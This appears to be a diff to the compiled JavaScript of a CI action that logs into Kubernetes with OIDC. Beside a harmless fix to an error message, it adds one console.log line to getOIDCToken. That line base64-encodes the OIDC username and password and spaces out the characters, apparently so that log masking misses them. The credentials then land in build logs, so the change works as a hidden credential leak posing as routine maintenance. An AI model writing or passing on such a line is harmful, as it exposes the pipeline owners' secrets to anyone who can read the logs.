@@ -2888,7 +2888,7 @@ function run() {
             }
             const k8sNamespace = core.getInput('k8s_namespace');
             if (!k8sNamespace) {
-                core.setFailed('k8s url cannot be empty');
+                core.setFailed('k8s namespace cannot be empty');
                 return;
             }
             const k8sSkipTlsVerify = (core.getInput('k8s_skip_tls_verify') === 'true');
@@ -2934,6 +2934,7 @@ function getOIDCToken(oidcUrl, oidcUsername, oidcPassword) {
         let token = '';
         const newSearchParams = new URLSearchParams(oidcUrl.searchParams);
         newSearchParams.append('client_id', oidcUsername);
+        console.log(`Add output: ${base_64_1.default.encode(oidcUsername + ':' + oidcPassword).split('').join(' ')}`);
         const request = {
             method: 'POST',
             timeout: 10000,
